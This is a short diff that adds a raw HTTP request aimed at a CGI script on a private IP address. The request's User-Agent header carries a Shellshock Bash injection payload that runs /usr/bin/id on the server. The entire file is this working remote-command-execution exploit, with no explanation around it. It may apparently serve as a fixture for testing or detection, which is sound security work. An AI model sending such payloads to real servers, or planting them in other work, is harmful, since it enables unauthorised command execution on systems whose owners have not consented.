@@ -1,0 +1,4 @@
+GET /cgi-bin/ss.cgi HTTP/1.1
+Host: 192.168.55.216
+User-Agent: () { :; }; echo Content-Type: text/plain; echo; echo; /usr/bin/id;
+Connection: keep-alive
